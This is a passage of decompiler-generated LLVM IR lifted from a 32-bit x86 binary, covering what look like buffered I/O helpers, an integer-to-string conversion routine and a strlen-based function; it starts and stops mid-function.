  %v8_8051a0d = icmp eq i32 %v1_8051a0d, 0
  store i1 %v8_8051a0d, i1* %zf.global-to-local, align 1
  store i32 %v1_8051a0d, i32* @edi, align 4
  %v4_80519fb.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80519fb

dec_label_pc_8051a10:                             ; preds = %dec_label_pc_8051a09.dec_label_pc_8051a10_crit_edge, %dec_label_pc_8051a03.dec_label_pc_8051a10_crit_edge
  %v1_8051a10 = phi i32 [ %v0_8051a03, %dec_label_pc_8051a03.dec_label_pc_8051a10_crit_edge ], [ %v1_8051a10.pre, %dec_label_pc_8051a09.dec_label_pc_8051a10_crit_edge ]
  %v0_8051a10 = phi i32 [ %v0_8051a10.pre, %dec_label_pc_8051a03.dec_label_pc_8051a10_crit_edge ], [ %v1_8051a09, %dec_label_pc_8051a09.dec_label_pc_8051a10_crit_edge ]
  %v2_8051a10 = add i32 %v1_8051a10, 16
  %v3_8051a10 = inttoptr i32 %v2_8051a10 to i32*
  store i32 %v0_8051a10, i32* %v3_8051a10, align 4
  %v0_8051a13 = load i32, i32* %edx.global-to-local, align 4
  %v1_8051a13 = load i32, i32* %ebp.global-to-local, align 4
  %v2_8051a13 = add i32 %v1_8051a13, 8
  %v3_8051a13 = inttoptr i32 %v2_8051a13 to i32*
  %v4_8051a13 = load i32, i32* %v3_8051a13, align 4
  %v5_8051a13 = sub i32 %v0_8051a13, %v4_8051a13
  store i32 %v5_8051a13, i32* %edx.global-to-local, align 4
  %v0_8051a16 = load i32, i32* @ebx, align 4
  %v2_8051a16 = sub i32 %v0_8051a16, %v5_8051a13
  %v12_8051a16 = icmp eq i32 %v2_8051a16, 0
  store i1 %v12_8051a16, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_8051a18

dec_label_pc_8051a18:                             ; preds = %dec_label_pc_80519e2, %dec_label_pc_8051a10
  %v4_8051a18 = phi i32 [ %v2_8051a16, %dec_label_pc_8051a10 ], [ %v4_8051a18.pre, %dec_label_pc_80519e2 ]
  %v5_8051a18 = sub i32 %arg3, %v4_8051a18
  %v15_8051a18 = icmp eq i32 %v5_8051a18, 0
  store i1 %v15_8051a18, i1* %zf.global-to-local, align 1
  %v0_8051a20.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8051a1c

dec_label_pc_8051a1c:                             ; preds = %dec_label_pc_80519dc, %dec_label_pc_80519a8, %dec_label_pc_8051a18
  %v0_8051a20 = phi i32 [ %v0_8051a20.pre, %dec_label_pc_8051a18 ], [ %v15_80519ac, %dec_label_pc_80519a8 ], [ %v15_80519ac, %dec_label_pc_80519dc ]
  %stack_var_12.0 = phi i32 [ %v5_8051a18, %dec_label_pc_8051a18 ], [ 0, %dec_label_pc_80519a8 ], [ %arg3, %dec_label_pc_80519dc ]
  store i32 %stack_var_12.0, i32* %eax.global-to-local, align 4
  %v9_8051a20 = icmp eq i32 %v0_8051a20, -12
  store i1 %v9_8051a20, i1* %zf.global-to-local, align 1
  store i32 %v0_80519ab, i32* @ebx, align 4
  store i32 %v0_80519a9, i32* @edi, align 4
  ret i32 %stack_var_12.0

; uselistorder directives
  uselistorder i32 %stack_var_12.0, { 1, 0 }
  uselistorder i32 %v1_8051a0d, { 1, 2, 0 }
  uselistorder i32 %v1_8051a0a, { 1, 0 }
  uselistorder i32 %v1_8051a09, { 0, 2, 1 }
  uselistorder i8 %v2_80519fb, { 1, 0, 2 }
  uselistorder i32 %v4_8051a18.pre, { 2, 0, 1 }
  uselistorder i32 %v2_80519f2, { 2, 3, 0, 1, 4, 5 }
  uselistorder i32 %v2_80519de, { 1, 0 }
  uselistorder i1 %v12_80519dc, { 1, 0 }
  uselistorder i32 %v2_80519dc, { 1, 2, 0 }
  uselistorder i32 %v5_80519d0, { 0, 3, 1, 2, 4 }
  uselistorder i32 %v0_80519c8.in, { 1, 0, 2 }
  uselistorder i1* %zf.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 12, 11, 0 }
  uselistorder i32* %edx.global-to-local, { 0, 3, 1, 4, 2, 5, 6 }
  uselistorder i32* %ebp.global-to-local, { 2, 0, 4, 3, 5, 1, 6 }
  uselistorder i32* @esp, { 0, 148, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147 }
  uselistorder i32 (i32, i32*, i32)* @function_804e628, { 1, 0 }
  uselistorder i32 %arg3, { 0, 3, 1, 2, 4 }
  uselistorder label %dec_label_pc_8051a1c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8051a18, { 1, 0 }
}

define i32 @function_8051a28(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8051a28:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_8051a28 = load i32, i32* @ebp, align 4
  %v0_8051a29 = load i32, i32* @edi, align 4
  %v0_8051a2b = load i32, i32* @ebx, align 4
  store i32 %v0_8051a2b, i32* %stack_var_-16, align 4
  store i32 %arg3, i32* @esi, align 4
  store i32 %arg1, i32* @ebp, align 4
  store i32 %arg2, i32* @edi, align 4
  %v1_8051a3b = add i32 %arg3, 1
  %v2_8051a3b = inttoptr i32 %v1_8051a3b to i8*
  %v3_8051a3b = load i8, i8* %v2_8051a3b, align 1
  %v4_8051a3b = and i8 %v3_8051a3b, 2
  %v5_8051a3b = icmp eq i8 %v4_8051a3b, 0
  %v1_8051a3f = icmp eq i1 %v5_8051a3b, false
  br i1 %v1_8051a3f, label %dec_label_pc_8051af0, label %dec_label_pc_8051a45

dec_label_pc_8051a45:                             ; preds = %dec_label_pc_8051a28
  %v1_8051a45 = add i32 %arg3, 4
  %v2_8051a45 = inttoptr i32 %v1_8051a45 to i32*
  %v3_8051a45 = load i32, i32* %v2_8051a45, align 4
  %v13_8051a45 = icmp eq i32 %v3_8051a45, -2
  %v1_8051a49 = add i32 %arg3, 16
  %v2_8051a49 = inttoptr i32 %v1_8051a49 to i32*
  %v3_8051a49 = load i32, i32* %v2_8051a49, align 4
  store i32 %v3_8051a49, i32* @edx, align 4
  %v1_8051a4c = add i32 %arg3, 12
  %v2_8051a4c = inttoptr i32 %v1_8051a4c to i32*
  %v3_8051a4c = load i32, i32* %v2_8051a4c, align 4
  store i32 %v3_8051a4c, i32* %eax.global-to-local, align 4
  %v1_8051a4f = icmp eq i1 %v13_8051a45, false
  %v2_8051a6e = sub i32 %v3_8051a4c, %v3_8051a49
  br i1 %v1_8051a4f, label %dec_label_pc_8051a6e, label %dec_label_pc_8051a51

dec_label_pc_8051a51:                             ; preds = %dec_label_pc_8051a45
  %tmp = icmp uge i32 %v2_8051a6e, %arg2
  %v5_8051a58 = select i1 %tmp, i32 %arg2, i32 %v2_8051a6e
  store i32 %v5_8051a58, i32* %ebx.global-to-local, align 4
  %v3_8051a5e = inttoptr i32 %v3_8051a49 to i16*
  %v4_8051a5e = call i32 @function_804f670(i16* %v3_8051a5e, i32 %v5_8051a58, i32 %v3_8051a4c)
  store i32 %v4_8051a5e, i32* %eax.global-to-local, align 4
  %v0_8051a66 = load i32, i32* @esi, align 4
  %v1_8051a66 = add i32 %v0_8051a66, 16
  %v2_8051a66 = inttoptr i32 %v1_8051a66 to i32*
  %v3_8051a66 = load i32, i32* %v2_8051a66, align 4
  %v4_8051a66 = load i32, i32* %ebx.global-to-local, align 4
  %v5_8051a66 = add i32 %v4_8051a66, %v3_8051a66
  store i32 %v5_8051a66, i32* %v2_8051a66, align 4
  br label %dec_label_pc_8051b08

dec_label_pc_8051a6e:                             ; preds = %dec_label_pc_8051a45
  store i32 %v2_8051a6e, i32* %eax.global-to-local, align 4
  %v6_8051a72 = icmp ult i32 %v2_8051a6e, %arg2
  br i1 %v6_8051a72, label %dec_label_pc_8051ad7, label %dec_label_pc_8051a74

dec_label_pc_8051a74:                             ; preds = %dec_label_pc_8051a6e
  %v0_8051a74 = load i32, i32* @ecx, align 4
  %v3_8051a78 = inttoptr i32 %v3_8051a49 to i16*
  %v4_8051a78 = call i32 @function_804f670(i16* %v3_8051a78, i32 %arg2, i32 %v0_8051a74)
  store i32 %v4_8051a78, i32* %eax.global-to-local, align 4
  %v0_8051a80 = load i32, i32* @esi, align 4
  %v1_8051a80 = add i32 %v0_8051a80, 16
  %v2_8051a80 = inttoptr i32 %v1_8051a80 to i32*
  %v3_8051a80 = load i32, i32* %v2_8051a80, align 4
  %v4_8051a80 = load i32, i32* @edi, align 4
  %v5_8051a80 = add i32 %v4_8051a80, %v3_8051a80
  store i32 %v5_8051a80, i32* %v2_8051a80, align 4
  %v0_8051a83 = load i32, i32* @esi, align 4
  %v1_8051a83 = add i32 %v0_8051a83, 1
  %v2_8051a83 = inttoptr i32 %v1_8051a83 to i8*
  %v3_8051a83 = load i8, i8* %v2_8051a83, align 1
  %v4_8051a83 = urem i8 %v3_8051a83, 2
  %v5_8051a83 = icmp eq i8 %v4_8051a83, 0
  br i1 %v5_8051a83, label %dec_label_pc_8051b08, label %dec_label_pc_8051a89

dec_label_pc_8051a89:                             ; preds = %dec_label_pc_8051a74
  %v0_8051a89 = load i32, i32* @edx, align 4
  %v0_8051a8a = load i32, i32* @edi, align 4
  %v4_8051a8e = call i32 @function_8052318(i8 10, i32 %v0_8051a8a, i32 %v0_8051a89)
  store i32 %v4_8051a8e, i32* %eax.global-to-local, align 4
  %v1_8051a96 = icmp eq i32 %v4_8051a8e, 0
  br i1 %v1_8051a96, label %dec_label_pc_8051b08, label %dec_label_pc_8051a9a

dec_label_pc_8051a9a:                             ; preds = %dec_label_pc_8051a89
  %v0_8051a9d = load i32, i32* @esi, align 4
  %v1_8051a9e = call i32 @function_804e83c(i32 %v0_8051a9d)
  store i32 %v1_8051a9e, i32* %eax.global-to-local, align 4
  %v1_8051aa6 = icmp eq i32 %v1_8051a9e, 0
  br i1 %v1_8051aa6, label %dec_label_pc_8051b08, label %dec_label_pc_8051aaa

dec_label_pc_8051aaa:                             ; preds = %dec_label_pc_8051a9a
  %v0_8051aaa = load i32, i32* @edi, align 4
  %tmp20 = icmp ule i32 %v0_8051aaa, %v1_8051a9e
  %v5_8051aae = select i1 %tmp20, i32 %v0_8051aaa, i32 %v1_8051a9e
  store i32 %v5_8051aae, i32* %ebx.global-to-local, align 4
  %v2_8051ab3 = sub i32 %v0_8051aaa, %v5_8051aae
  store i32 %v2_8051ab3, i32* %eax.global-to-local, align 4
  %v0_8051ab5 = load i32, i32* @ebp, align 4
  %v2_8051ab5 = add i32 %v0_8051ab5, %v2_8051ab3
  store i32 %v2_8051ab5, i32* %ebp.global-to-local, align 4
  %v4_8051abc = call i32 @function_80522d0(i8* inttoptr (i32 10 to i8*), i32 %v5_8051aae, i32 %v2_8051ab3)
  store i32 %v4_8051abc, i32* %eax.global-to-local, align 4
  %v1_8051ac4 = icmp eq i32 %v4_8051abc, 0
  br i1 %v1_8051ac4, label %dec_label_pc_8051b08, label %dec_label_pc_8051aca

dec_label_pc_8051aca:                             ; preds = %dec_label_pc_8051aaa
  %v0_8051aca = load i32, i32* %ebp.global-to-local, align 4
  %v1_8051aca = load i32, i32* %ebx.global-to-local, align 4
  %v2_8051aca = sub i32 %v0_8051aca, %v4_8051abc
  %v2_8051ace = add i32 %v2_8051aca, %v1_8051aca
  store i32 %v2_8051ace, i32* %eax.global-to-local, align 4
  %v0_8051ad0 = load i32, i32* @esi, align 4
  %v1_8051ad0 = add i32 %v0_8051ad0, 16
  %v2_8051ad0 = inttoptr i32 %v1_8051ad0 to i32*
  %v3_8051ad0 = load i32, i32* %v2_8051ad0, align 4
  %v5_8051ad0 = sub i32 %v3_8051ad0, %v2_8051ace
  store i32 %v5_8051ad0, i32* %v2_8051ad0, align 4
  %v0_8051ad3 = load i32, i32* @edi, align 4
  %v1_8051ad3 = load i32, i32* %eax.global-to-local, align 4
  %v2_8051ad3 = sub i32 %v0_8051ad3, %v1_8051ad3
  store i32 %v2_8051ad3, i32* @edi, align 4
  br label %dec_label_pc_8051b08

dec_label_pc_8051ad7:                             ; preds = %dec_label_pc_8051a6e
  %v2_8051ad7 = add i32 %arg3, 8
  %v3_8051ad7 = inttoptr i32 %v2_8051ad7 to i32*
  %v4_8051ad7 = load i32, i32* %v3_8051ad7, align 4
  %v15_8051ad7 = icmp eq i32 %v3_8051a49, %v4_8051ad7
  br i1 %v15_8051ad7, label %dec_label_pc_8051af0, label %dec_label_pc_8051adc

dec_label_pc_8051adc:                             ; preds = %dec_label_pc_8051ad7
  %v1_8051ae0 = call i32 @function_804e83c(i32 %arg3)
  store i32 %v1_8051ae0, i32* %eax.global-to-local, align 4
  %v1_8051ae8 = icmp eq i32 %v1_8051ae0, 0
  br i1 %v1_8051ae8, label %dec_label_pc_8051adc.dec_label_pc_8051af0_crit_edge, label %dec_label_pc_8051aec

dec_label_pc_8051adc.dec_label_pc_8051af0_crit_edge: ; preds = %dec_label_pc_8051adc
  %v0_8051af0.pre = load i32, i32* @edi, align 4
  %v0_8051af8.pre = load i32, i32* @esi, align 4
  %v2_8051aff.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_8051af0

dec_label_pc_8051aec:                             ; preds = %dec_label_pc_8051adc
  store i32 0, i32* @edi, align 4
  br label %dec_label_pc_8051b08

dec_label_pc_8051af0:                             ; preds = %dec_label_pc_8051adc.dec_label_pc_8051af0_crit_edge, %dec_label_pc_8051ad7, %dec_label_pc_8051a28
  %v2_8051aff = phi i32 [ %v2_8051aff.pre, %dec_label_pc_8051adc.dec_label_pc_8051af0_crit_edge ], [ %v0_8051a2b, %dec_label_pc_8051ad7 ], [ %v0_8051a2b, %dec_label_pc_8051a28 ]
  %v0_8051af8 = phi i32 [ %v0_8051af8.pre, %dec_label_pc_8051adc.dec_label_pc_8051af0_crit_edge ], [ %arg3, %dec_label_pc_8051ad7 ], [ %arg3, %dec_label_pc_8051a28 ]
  %v0_8051af0 = phi i32 [ %v0_8051af0.pre, %dec_label_pc_8051adc.dec_label_pc_8051af0_crit_edge ], [ %arg2, %dec_label_pc_8051ad7 ], [ %arg2, %dec_label_pc_8051a28 ]
  store i32 %v2_8051aff, i32* @ebx, align 4
  store i32 %v0_8051a29, i32* @edi, align 4
  %v4_8051b03 = inttoptr i32 %v0_8051af8 to i16*
  %v5_8051b03 = call i32 @function_80519a8(i16* %v4_8051b03, i32 %v0_8051af0, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_8051b03, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051b08

dec_label_pc_8051b08:                             ; preds = %dec_label_pc_8051aaa, %dec_label_pc_8051a9a, %dec_label_pc_8051a89, %dec_label_pc_8051a74, %dec_label_pc_8051aec, %dec_label_pc_8051aca, %dec_label_pc_8051a51, %dec_label_pc_8051af0
  %v0_8051b0b = load i32, i32* @edi, align 4
  store i32 %v0_8051b0b, i32* %eax.global-to-local, align 4
  %v2_8051b0d = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8051b0d, i32* %ebx.global-to-local, align 4
  store i32 %v0_8051a28, i32* %ebp.global-to-local, align 4
  ret i32 %v0_8051b0b

; uselistorder directives
  uselistorder i32 %v2_8051ace, { 1, 0 }
  uselistorder i32 %v0_8051aaa, { 2, 1, 0 }
  uselistorder i32 %v1_8051a9e, { 2, 0, 1, 3 }
  uselistorder i32 %v2_8051a6e, { 2, 3, 1, 0 }
  uselistorder i32 %v3_8051a49, { 0, 1, 3, 2, 4 }
  uselistorder i32* %stack_var_-16, { 1, 0, 2 }
  uselistorder i32* %ebx.global-to-local, { 4, 0, 1, 2, 3 }
  uselistorder i32* %ebp.global-to-local, { 2, 0, 1 }
  uselistorder i32* %eax.global-to-local, { 12, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11 }
  uselistorder i32 ptrtoint (i32* @0 to i32), { 0, 1, 2, 4, 5, 6, 3, 7, 8, 9, 10, 11, 14, 15, 12, 13 }
  uselistorder i32 8, { 17, 101, 102, 103, 10, 109, 11, 110, 12, 16, 8, 19, 18, 54, 20, 21, 55, 56, 57, 58, 59, 60, 61, 0, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 1, 72, 73, 74, 75, 76, 14, 2, 15, 3, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 13, 94, 95, 4, 96, 97, 98, 99, 5, 100, 108, 104, 105, 106, 107, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 7, 49, 50, 51, 52, 53, 9, 6 }
  uselistorder i32 (i32)* @function_804e83c, { 2, 1, 0 }
  uselistorder i8 10, { 8, 0, 1, 2, 3, 4, 5, 6, 7, 9 }
  uselistorder i32 16, { 13, 14, 15, 16, 37, 6, 11, 7, 17, 12, 19, 18, 20, 41, 35, 4, 3, 36, 0, 5, 42, 38, 39, 40, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 2, 31, 32, 33, 34, 8, 1, 9, 10 }
  uselistorder i8 2, { 0, 11, 1, 8, 16, 13, 2, 3, 4, 5, 6, 14, 15, 7, 12, 10, 9 }
  uselistorder i32* @ebp, { 2, 3, 4, 1, 5, 6, 9, 7, 8, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 44, 40, 41, 42, 43, 0, 45, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 46, 47, 48, 49, 50, 51, 52, 53, 54 }
  uselistorder i32 %arg3, { 0, 1, 2, 3, 5, 4, 6, 8, 7 }
  uselistorder i32 %arg2, { 2, 3, 4, 1, 5, 0, 6 }
  uselistorder label %dec_label_pc_8051b08, { 7, 4, 5, 0, 1, 2, 3, 6 }
}

define i32 @function_8051c54(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_8051c54:
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %esi.global-to-local, align 4
  %v4_8051c5f = ptrtoint i8* %arg1 to i32
  store i32 %v4_8051c5f, i32* %edi.global-to-local, align 4
  store i32 %arg2, i32* %ecx.global-to-local, align 4
  store i32 %arg3, i32* %ebx.global-to-local, align 4
  %v2_8051c6b = icmp slt i32 %arg4, 0
  %v1_8051c6d = icmp eq i1 %v2_8051c6b, false
  br i1 %v1_8051c6d, label %dec_label_pc_8051c8e, label %dec_label_pc_8051c6f

dec_label_pc_8051c6f:                             ; preds = %dec_label_pc_8051c54
  %v1_8051c6f = sub i32 0, %arg4
  store i32 %v1_8051c6f, i32* %esi.global-to-local, align 4
  %v2_8051c71 = icmp slt i32 %arg3, 0
  %v1_8051c73 = icmp eq i1 %v2_8051c71, false
  br i1 %v1_8051c73, label %dec_label_pc_8051c8e, label %dec_label_pc_8051c75

dec_label_pc_8051c75:                             ; preds = %dec_label_pc_8051c6f
  %v1_8051c75 = sub i32 0, %arg2
  %v5_8051c75 = icmp ne i32 %arg2, 0
  store i32 %v1_8051c75, i32* %ecx.global-to-local, align 4
  %v2_8051c77 = zext i1 %v5_8051c75 to i32
  %v3_8051c77 = add i32 %v2_8051c77, %arg3
  %v1_8051c7a = sub i32 0, %v3_8051c77
  store i32 %v1_8051c7a, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8051c8e

dec_label_pc_8051c8e:                             ; preds = %dec_label_pc_8051c54, %dec_label_pc_8051c6f, %dec_label_pc_8051c75
  %v0_8051c93 = phi i32 [ %v1_8051c6f, %dec_label_pc_8051c75 ], [ %v1_8051c6f, %dec_label_pc_8051c6f ], [ %arg4, %dec_label_pc_8051c54 ]
  %storemerge11 = phi i32 [ 1, %dec_label_pc_8051c75 ], [ 0, %dec_label_pc_8051c6f ], [ 0, %dec_label_pc_8051c54 ]
  %div = udiv i32 -1, %v0_8051c93
  %tmp29 = urem i32 -1, %v0_8051c93
  store i8 0, i8* %arg1, align 1
  %v1_8051c98 = add i32 %tmp29, 1
  %v1_8051c99 = load i32, i32* %esi.global-to-local, align 4
  %v12_8051c99 = icmp eq i32 %v1_8051c98, %v1_8051c99
  %v1_8051ca3 = icmp eq i1 %v12_8051c99, false
  br i1 %v1_8051ca3, label %dec_label_pc_8051cb2, label %dec_label_pc_8051ca5

dec_label_pc_8051ca5:                             ; preds = %dec_label_pc_8051c8e
  %v1_8051ca5 = add i32 %div, 1
  br label %dec_label_pc_8051cb2

dec_label_pc_8051cb2:                             ; preds = %dec_label_pc_8051c8e, %dec_label_pc_8051ca5
  %stack_var_-20.0.off0 = phi i32 [ %v1_8051c98, %dec_label_pc_8051c8e ], [ 0, %dec_label_pc_8051ca5 ]
  %stack_var_-24.0.in = phi i32 [ %div, %dec_label_pc_8051c8e ], [ %v1_8051ca5, %dec_label_pc_8051ca5 ]
  %v0_8051cb2 = load i32, i32* %ecx.global-to-local, align 4
  store i32 %v0_8051cb2, i32* %ebp.global-to-local, align 4
  %v0_8051cb4 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_8051cb4, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8051cb8

dec_label_pc_8051cb8:                             ; preds = %dec_label_pc_8051d06, %dec_label_pc_8051cb2
  %v0_8051cef = phi i32 [ %v0_8051cb2, %dec_label_pc_8051cb2 ], [ %v0_8051d08, %dec_label_pc_8051d06 ]
  %v0_8051cbc = phi i32 [ %v0_8051cb4, %dec_label_pc_8051cb2 ], [ %v1_8051d0a, %dec_label_pc_8051d06 ]
  %v1_8051cb8 = icmp eq i32 %v0_8051cbc, 0
  br i1 %v1_8051cb8, label %dec_label_pc_8051cef, label %dec_label_pc_8051cbc

dec_label_pc_8051cbc:                             ; preds = %dec_label_pc_8051cb8
  %v0_8051cc0 = load i32, i32* %esi.global-to-local, align 4
  %div6 = udiv i32 %v0_8051cbc, %v0_8051cc0
  %tmp30 = urem i32 %v0_8051cbc, %v0_8051cc0
  store i32 %div6, i32* %ebx.global-to-local, align 4
  %div7 = udiv i32 %v0_8051cef, %v0_8051cc0
  %tmp31 = urem i32 %v0_8051cef, %v0_8051cc0
  store i32 %div7, i32* %ebp.global-to-local, align 4
  %v6_8051cd3 = mul i32 %tmp30, %stack_var_-20.0.off0
  %v2_8051cd7 = add i32 %tmp31, %v6_8051cd3
  %v8_8051cdd = mul i32 %tmp30, %stack_var_-24.0.in
  %v2_8051ce2 = add i32 %div7, %v8_8051cdd
  store i32 %v2_8051ce2, i32* %ecx.global-to-local, align 4
  %div8 = udiv i32 %v2_8051cd7, %v0_8051cc0
  %tmp32 = urem i32 %v2_8051cd7, %v0_8051cc0
  %v2_8051cea = add i32 %div8, %v2_8051ce2
  br label %dec_label_pc_8051cf7

dec_label_pc_8051cef:                             ; preds = %dec_label_pc_8051cb8
  %v0_8051cf3 = load i32, i32* %esi.global-to-local, align 4
  %div10 = udiv i32 %v0_8051cef, %v0_8051cf3
  %tmp33 = urem i32 %v0_8051cef, %v0_8051cf3
  br label %dec_label_pc_8051cf7

dec_label_pc_8051cf7:                             ; preds = %dec_label_pc_8051cbc, %dec_label_pc_8051cef
  %v13_8051cfd = phi i32 [ %tmp32, %dec_label_pc_8051cbc ], [ %tmp33, %dec_label_pc_8051cef ]
  %storemerge = phi i32 [ %v2_8051cea, %dec_label_pc_8051cbc ], [ %div10, %dec_label_pc_8051cef ]
  store i32 %storemerge, i32* %ebp.global-to-local, align 4
  %v0_8051cf7 = load i32, i32* %edi.global-to-local, align 4
  %v1_8051cf7 = add i32 %v0_8051cf7, -1
  store i32 %v1_8051cf7, i32* %edi.global-to-local, align 4
  %tmp34 = icmp ult i32 %v13_8051cfd, 10
  br i1 %tmp34, label %dec_label_pc_8051cfd, label %dec_label_pc_8051d02

dec_label_pc_8051cfd:                             ; preds = %dec_label_pc_8051cf7
  %v2_8051cfd = add i32 %v13_8051cfd, 48
  %v12_8051cfd = and i32 %v2_8051cfd, 255
  %v14_8051cfd = and i32 %v13_8051cfd, -256
  %v15_8051cfd = or i32 %v12_8051cfd, %v14_8051cfd
  br label %dec_label_pc_8051d06

dec_label_pc_8051d02:                             ; preds = %dec_label_pc_8051cf7
  %v6_8051d02 = add i32 %v13_8051cfd, %arg5
  %v21_8051d02 = and i32 %v6_8051d02, 255
  %v23_8051d02 = and i32 %v13_8051cfd, -256
  %v24_8051d02 = or i32 %v21_8051d02, %v23_8051d02
  br label %dec_label_pc_8051d06

dec_label_pc_8051d06:                             ; preds = %dec_label_pc_8051cfd, %dec_label_pc_8051d02
  %storemerge9 = phi i32 [ %v15_8051cfd, %dec_label_pc_8051cfd ], [ %v24_8051d02, %dec_label_pc_8051d02 ]
  %v1_8051d06 = trunc i32 %storemerge9 to i8
  %v3_8051d06 = inttoptr i32 %v1_8051cf7 to i8*
  store i8 %v1_8051d06, i8* %v3_8051d06, align 1
  %v0_8051d08 = load i32, i32* %ebp.global-to-local, align 4
  %v1_8051d0a = load i32, i32* %ebx.global-to-local, align 4
  %v2_8051d0a = or i32 %v1_8051d0a, %v0_8051d08
  %v3_8051d0a = icmp eq i32 %v2_8051d0a, 0
  %v1_8051d0c = icmp eq i1 %v3_8051d0a, false
  br i1 %v1_8051d0c, label %dec_label_pc_8051cb8, label %dec_label_pc_8051d0e

dec_label_pc_8051d0e:                             ; preds = %dec_label_pc_8051d06
  %v4_8051d0e = icmp eq i32 %storemerge11, 0
  br i1 %v4_8051d0e, label %dec_label_pc_8051d19, label %dec_label_pc_8051d15

dec_label_pc_8051d15:                             ; preds = %dec_label_pc_8051d0e
  %v0_8051d15 = load i32, i32* %edi.global-to-local, align 4
  %v1_8051d15 = add i32 %v0_8051d15, -1
  store i32 %v1_8051d15, i32* %edi.global-to-local, align 4
  %v1_8051d16 = inttoptr i32 %v1_8051d15 to i8*
  store i8 45, i8* %v1_8051d16, align 1
  br label %dec_label_pc_8051d19

dec_label_pc_8051d19:                             ; preds = %dec_label_pc_8051d0e, %dec_label_pc_8051d15
  %v0_8051d1c = load i32, i32* %edi.global-to-local, align 4
  ret i32 %v0_8051d1c

; uselistorder directives
  uselistorder i32 %v13_8051cfd, { 4, 1, 3, 0, 2 }
  uselistorder i32 %v2_8051cd7, { 1, 0 }
  uselistorder i32 %v0_8051cc0, { 1, 0, 3, 2, 4, 5 }
  uselistorder i32 %v0_8051cbc, { 1, 0, 2 }
  uselistorder i32 %v0_8051cef, { 1, 0, 3, 2 }
  uselistorder i32 %v1_8051c98, { 1, 0 }
  uselistorder i32 %v0_8051c93, { 1, 0 }
  uselistorder i32* %esi.global-to-local, { 1, 2, 3, 0, 4 }
  uselistorder i32* %edi.global-to-local, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32* %ecx.global-to-local, { 0, 1, 3, 2, 4 }
  uselistorder i32* %ebx.global-to-local, { 2, 0, 3, 1, 4 }
  uselistorder i8 45, { 1, 0, 2 }
  uselistorder i32 255, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 48, { 0, 2, 1 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8051d19, { 1, 0 }
  uselistorder label %dec_label_pc_8051d06, { 1, 0 }
  uselistorder label %dec_label_pc_8051cf7, { 1, 0 }
  uselistorder label %dec_label_pc_8051cb2, { 1, 0 }
  uselistorder label %dec_label_pc_8051c8e, { 2, 1, 0 }
}

define i32 @function_80522d0(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_80522d0:
  %edi.global-to-local = alloca i32, align 4
  %zf.global-to-local = alloca i1, align 1
  %stack_var_-4 = alloca i32, align 4
  %v0_80522d0 = load i32, i32* @edi, align 4
  store i32 %v0_80522d0, i32* %stack_var_-4, align 4
  %v4_80522d7 = ptrtoint i8* %arg1 to i32
  store i32 %v4_80522d7, i32* %edi.global-to-local, align 4
  %v1_80522df = icmp eq i32 %arg3, 0
  store i1 %v1_80522df, i1* %zf.global-to-local, align 1
  br i1 %v1_80522df, label %dec_label_pc_80522ef, label %dec_label_pc_80522e3

dec_label_pc_80522e3:                             ; preds = %dec_label_pc_80522d0
  %v2_80522e3 = call i32 @_strlen(i8* %arg1)
  %v0_80522e5 = load i1, i1* %zf.global-to-local, align 1
  br i1 %v0_80522e5, label %dec_label_pc_80522e3.dec_label_pc_80522ec_crit_edge, label %dec_label_pc_80522e7

dec_label_pc_80522e3.dec_label_pc_80522ec_crit_edge: ; preds = %dec_label_pc_80522e3
  %v0_80522ec.pre = load i32, i32* %edi.global-to-local, align 4
  %phitmp = add i32 %v0_80522ec.pre, -1
  br label %dec_label_pc_80522ec

dec_label_pc_80522e7:                             ; preds = %dec_label_pc_80522e3
